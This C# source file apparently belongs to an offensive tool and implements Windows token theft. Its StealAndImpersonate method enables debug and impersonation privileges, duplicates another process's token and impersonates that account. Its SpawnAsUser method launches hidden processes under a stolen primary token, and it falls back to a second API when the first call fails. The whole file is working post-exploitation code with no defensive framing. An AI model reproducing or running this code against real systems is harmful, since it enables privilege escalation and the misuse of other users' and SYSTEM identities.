using System;
using System.Runtime.InteropServices;

public class TornadoTokenOps
{
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;

    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_IMPERSONATE = 0x0004;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;

    const int SecurityImpersonation = 2;
    const int TokenPrimary = 1;
    const int TokenImpersonation = 2;

    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    const uint CREATE_NO_WINDOW = 0x08000000;
    const int ERROR_NOT_ALL_ASSIGNED = 1300;

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags,
        string lpApplicationName, string lpCommandLine, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName,
        string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    static IntPtr _cachedToken = IntPtr.Zero;

    public static string EnablePrivilege(string privilegeName)
    {
        IntPtr hToken = IntPtr.Zero;
        try
        {
            if (!OpenProcessToken(GetCurrentProcess(),
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                return "OpenProcessToken failed: " + Marshal.GetLastWin32Error();

            LUID luid;
            if (!LookupPrivilegeValue(null, privilegeName, out luid))
                return "LookupPrivilegeValue failed: " + Marshal.GetLastWin32Error();

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privilege.Luid = luid;
            tp.Privilege.Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                return "AdjustTokenPrivileges failed: " + Marshal.GetLastWin32Error();

            int err = Marshal.GetLastWin32Error();
            if (err == ERROR_NOT_ALL_ASSIGNED)
                return "Privilege not held: " + privilegeName;

            return "";
        }
        finally
        {
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
        }
    }

    public static string StealAndImpersonate(int pid)
    {
        string dbgErr = EnablePrivilege("SeDebugPrivilege");
        string impErr = EnablePrivilege("SeImpersonatePrivilege");

        IntPtr hProcess = IntPtr.Zero;
        IntPtr hToken = IntPtr.Zero;
        IntPtr hDupToken = IntPtr.Zero;
        try
        {
            bool limitedHandle = false;
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
                if (hProcess != IntPtr.Zero)
                    limitedHandle = true;
            }
            if (hProcess == IntPtr.Zero)
            {
                int err = Marshal.GetLastWin32Error();
                string extra = "";
                if (err == 5 && dbgErr.Length > 0)
                    extra = " (SeDebugPrivilege unavailable: " + dbgErr + ")";
                return "OpenProcess(" + pid + ") failed: " + err + extra;
            }

            if (!OpenProcessToken(hProcess,
                    TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken))
            {
                int terr = Marshal.GetLastWin32Error();
                if (limitedHandle && terr == 5)
                    return "OpenProcessToken failed: 5 - PID " + pid
                         + " is a Protected Process Light (PPL) and denies "
                         + "token access by design. Choose a different PID.";
                string dbg = (dbgErr.Length > 0) ? "; " + dbgErr : "";
                string imp = (impErr.Length > 0) ? "; " + impErr : "";
                return "OpenProcessToken failed: " + terr + dbg + imp;
            }

            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SecurityImpersonation, TokenImpersonation, out hDupToken))
                return "DuplicateTokenEx failed: " + Marshal.GetLastWin32Error();

            if (_cachedToken != IntPtr.Zero)
            {
                CloseHandle(_cachedToken);
                _cachedToken = IntPtr.Zero;
            }

            string before = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            if (!ImpersonateLoggedOnUser(hDupToken))
            {
                CloseHandle(hDupToken);
                return "ImpersonateLoggedOnUser failed: " + Marshal.GetLastWin32Error();
            }

            string after = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            if (after == before)
            {
                CloseHandle(hDupToken);
                return "Impersonation returned success but identity unchanged (" + before + ")";
            }

            _cachedToken = hDupToken;
            hDupToken = IntPtr.Zero;

            return "";
        }
        finally
        {
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hDupToken != IntPtr.Zero) CloseHandle(hDupToken);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }

    public static string SpawnAsUser(int pid, string commandLine)
    {
        EnablePrivilege("SeDebugPrivilege");
        EnablePrivilege("SeImpersonatePrivilege");
        EnablePrivilege("SeAssignPrimaryTokenPrivilege");

        IntPtr hProcess = IntPtr.Zero;
        IntPtr hToken = IntPtr.Zero;
        IntPtr hPrimaryToken = IntPtr.Zero;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        try
        {
            bool limitedHandle = false;
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
                if (hProcess != IntPtr.Zero)
                    limitedHandle = true;
            }
            if (hProcess == IntPtr.Zero)
                return "OpenProcess(" + pid + ") failed: " + Marshal.GetLastWin32Error();

            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken))
            {
                int terr = Marshal.GetLastWin32Error();
                if (limitedHandle && terr == 5)
                    return "OpenProcessToken failed: 5 - PID " + pid
                         + " is a Protected Process Light (PPL) and denies "
                         + "token access by design. Choose a different PID.";
                return "OpenProcessToken failed: " + terr;
            }

            if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SecurityImpersonation, TokenPrimary, out hPrimaryToken))
                return "DuplicateTokenEx (primary) failed: " + Marshal.GetLastWin32Error();

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

            if (!CreateProcessWithTokenW(hPrimaryToken, 0, null, commandLine,
                    CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
            {
                int err1 = Marshal.GetLastWin32Error();
                if (!CreateProcessAsUser(hPrimaryToken, null, commandLine,
                        IntPtr.Zero, IntPtr.Zero, false, CREATE_NO_WINDOW,
                        IntPtr.Zero, null, ref si, out pi))
                {
                    int err2 = Marshal.GetLastWin32Error();
                    return "CreateProcessWithTokenW failed: " + err1
                         + " / CreateProcessAsUser failed: " + err2;
                }
            }

            return "PID:" + pi.dwProcessId;
        }
        finally
        {
            if (pi.hThread != IntPtr.Zero) CloseHandle(pi.hThread);
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (hPrimaryToken != IntPtr.Zero) CloseHandle(hPrimaryToken);
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }

    public static bool Revert()
    {
        if (_cachedToken != IntPtr.Zero)
        {
            CloseHandle(_cachedToken);
            _cachedToken = IntPtr.Zero;
        }
        return RevertToSelf();
    }
}